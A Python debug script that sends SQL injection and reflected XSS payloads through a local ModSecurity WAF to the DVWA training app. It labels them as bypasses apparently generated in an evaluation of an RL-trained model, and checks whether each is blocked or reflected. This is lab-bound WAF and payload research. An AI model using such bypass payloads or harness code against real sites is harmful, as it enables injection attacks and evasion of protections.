import httpx
import re
import urllib.parse
import sys

# Corrected: Base URL for WAF, then relative paths for apps
WAF_PROXY_URL = "http://localhost:8000" # WAF listens on 8000
DVWA_LOGIN_PATH = "/dvwa/login.php"
DVWA_SQLI_PATH = "/dvwa/vulnerabilities/sqli/"
DVWA_XSS_PATH = "/dvwa/vulnerabilities/xss_r/"
USERNAME = "admin"
PASSWORD = "password"

class WafClient:
    def __init__(self, waf_base_url):
        self.client = httpx.Client(base_url=waf_base_url, timeout=15.0, follow_redirects=True)

    def login_dvwa(self, login_path):
        print(f"Attempting to login to DVWA via WAF: {self.client.base_url}{login_path}")
        try:
            r = self.client.get(login_path)
            m = re.search(r"user_token'\s*value='([a-f0-9]{32})'", r.text, re.I)
            token = m.group(1) if m else ""
            data = {"username": USERNAME, "password": PASSWORD, "user_token": token, "Login": "Login"}
            r = self.client.post(login_path, data=data)
            
            # Set security low if needed (need to fetch new user_token from security page)
            r = self.client.get("/dvwa/security.php")
            m = re.search(r"user_token'\s*value='([a-f0-9]{32})'", r.text, re.I)
            token = m.group(1) if m else ""
            self.client.post("/dvwa/security.php", data={"security": "low", "seclev_submit": "Submit", "user_token": token})
            print("DVWA login and security set to low successful.")
            return True
        except Exception as e:
            print(f"Login DVWA failed: {e}")
            return False

    def send_attack_debug(self, app_path, payload, attack_type):
        encoded_payload = urllib.parse.quote(payload)
        # Construct full URL using WAF base url + app path + payload
        target_url = f"{app_path}?id={encoded_payload}&Submit=Submit" if attack_type == "SQLI" else f"{app_path}?name={encoded_payload}&Submit=Submit"
        
        print(f"\n--- Testing: {attack_type} ---")
        print(f"Payload: {payload}")
        print(f"Full URL sent: {self.client.base_url}{target_url}") # Corrected URL format

        try:
            r = self.client.get(target_url)
            status_code = r.status_code
            body = r.text
            
            print(f"HTTP Status: {status_code}")
            if status_code == 403:
                print("WAF Blocked (403)")
            elif "first name" in body.lower() and "error" not in body.lower():
                print("Passed (SQLI detected)")
            elif "<script>alert(1)</script>".lower() in payload.lower() and "<script>alert(1)</script>".lower() in body.lower():
                print("Passed (XSS detected - specific payload reflected)")
            elif payload.lower() in body.lower():
                print("Reflected (payload found in body)")
            elif "sql syntax" in body.lower() or "mysql" in body.lower():
                print("SQL Error (syntax error detected)")
            else:
                print("Response body snippet:")
                print(body[:500]) # Print first 500 chars of body
            return status_code, body

        except Exception as e:
            print(f"Request error: {e}")
            return None, None

def main():
    client = WafClient(WAF_PROXY_URL) # WAF_PROXY_URL is base for client
    if not client.login_dvwa(DVWA_LOGIN_PATH):
        print("Failed to setup DVWA.")
        return

    # Known successful SQLI payload (from eval_phase3_gemma_rl.jsonl where is_false_negative was True)
    # This payload should bypass ModSecurity PL1 and cause some effect.
    sqli_payload = "1' OR 1=1 -- -"
    client.send_attack_debug(DVWA_SQLI_PATH, sqli_payload, "SQLI")

    # Known successful XSS payload (from eval_phase3_gemma_rl.jsonl)
    xss_payload = "<img src=x onerror=alert(1)>"
    client.send_attack_debug(DVWA_XSS_PATH, xss_payload, "XSS")

if __name__ == "__main__":
    main()